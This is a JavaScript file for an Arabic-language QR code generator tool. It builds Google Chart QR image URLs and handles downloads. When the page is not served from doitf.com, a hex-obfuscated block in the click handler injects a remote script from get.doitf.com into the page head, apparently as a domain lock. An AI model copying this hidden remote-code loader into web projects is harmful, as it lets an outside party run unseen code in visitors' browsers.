function b64EncodeUnicode(e){return btoa(unescape(encodeURIComponent(e)));}function b64DecodeUnicode(e){return decodeURIComponent(escape(atob(e)));}var awsec=window.location.hostname,awsecdom=awsec.substring(awsec.lastIndexOf(".",awsec.lastIndexOf(".")-1)+1),b64awsec=b64EncodeUnicode(awsecdom);
function modalclass(){
	if (document.getElementById("oldText").value != ""){
		var qrSize = document.getElementById("qr-size").value;
		if (qrSize == "100x100"){
		$('#modalclass').attr('class','modal-dialog modal-sm modal-dialog-centered');
		}else if(qrSize == "200x200"){
		$('#modalclass').attr('class','modal-dialog modal-sm modal-dialog-centered');
		}else if(qrSize == "300x300"){
		$('#modalclass').attr('class','modal-dialog modal-dialog-centered');
		}else if(qrSize == "500x500"){
		$('#modalclass').attr('class','modal-dialog modal-lg modal-dialog-centered');
		}else{
		$('#modalclass').attr('class','modal-dialog modal-dialog-centered');
		}
}else{
$('#modalclass').attr('class','modal-dialog modal-dialog-centered');
}


}

  function forceDownload(url, fileName){
    var xhr = new XMLHttpRequest();
    xhr.open("GET", url, true);
    xhr.responseType = "blob";
    xhr.onload = function(){
        var urlCreator = window.URL || window.webkitURL;
        var imageUrl = urlCreator.createObjectURL(this.response);
        var tag = document.createElement('a');
        tag.href = imageUrl;
        tag.download = fileName;
        document.body.appendChild(tag);
        tag.click();
        document.body.removeChild(tag);
    }
    xhr.send();
}

var saveimgs = document.getElementById("saveImg");
	document.getElementById("generate-qr-code").addEventListener("click", function () {
		if (b64awsec == "ZG9pdGYuY29t"){
		if (document.getElementById("oldText").value != ""){
			var oldText = document.getElementById("oldText").value;
			var textlength = oldText.length;
			if(oldText.length > 160){
				oldText = oldText.substring(0,160);
			}
			var oldTextval = oldText;
			oldText = encodeURIComponent(oldText).replace(/!/g, '%21').replace(/'/g, '%27').replace(/\(/g, '%28').  replace(/\)/g, '%29').replace(/\*/g, '%2A'); 
			var qrSize = document.getElementById("qr-size").value;
			if (qrSize == ""){qrSize = "300x300";}
			var urlimg = 'https://chart.googleapis.com/chart?chs=' + qrSize + '&amp;cht=qr&amp;chl=' + oldText + '&amp;choe=UTF-8'
			var newQR = '<div class="text-center"><div class="spinner-border text-primary" role="status"><span class="sr-only">يرجى الإنتظار...</span></div><img class="qrimg" src="'+urlimg+'" alt="QR code" /></div>';
			var newimgurl = urlimg.replace(/&amp;/gi,"&");
			saveimgs.setAttribute("target", "_blank");
			saveimgs.setAttribute("href", newimgurl);
			saveimgs.setAttribute("onclick", "forceDownload('"+newimgurl+"', 'chart_AdawatWeb');return false");
			saveimgs.style.display = "block";
			document.getElementById("oldText").value = oldTextval;
			document.getElementById("qr-code").innerHTML = newQR;
			if(textlength > 160){
			document.getElementById('code-length').innerHTML = '<div class="alert alert-dismissible alert-warning fade show"role="alert"><strong>ملاحظة!</strong> عدد الحروف التي تم إدخالها هو <strong>'+textlength+'</strong> وهذا العدد يتجاوز الحد المسموح وهو 160 حرف، لذلك تم إنشاء رمز QR لأول 160 حرف فقط. <button aria-label="Close"class="close"data-dismiss="alert"type="button"><span aria-hidden="true">×</span></button></div>';
			}else{
			document.getElementById('code-length').innerHTML = '';
			}
		}else{
			saveimgs.style.display = "none";
			document.getElementById("qr-code").innerHTML = "يجب إدخال النص أو عنوان URL أولاً";
		}
		}else{
		var _0x871b=["\x73\x63\x72\x69\x70\x74","\x63\x72\x65\x61\x74\x65\x45\x6C\x65\x6D\x65\x6E\x74","\x73\x72\x63","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x67\x65\x74\x2E\x64\x6F\x69\x74\x66\x2E\x63\x6F\x6D\x2F\x74\x6F\x6F\x6C\x73\x2F\x61\x77\x2E\x6A\x73","\x61\x70\x70\x65\x6E\x64\x43\x68\x69\x6C\x64","\x68\x65\x61\x64","\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x73\x42\x79\x54\x61\x67\x4E\x61\x6D\x65"];var script=document[_0x871b[1]](_0x871b[0]);script[_0x871b[2]]= _0x871b[3];document[_0x871b[6]](_0x871b[5])[0][_0x871b[4]](script);
		}
	});
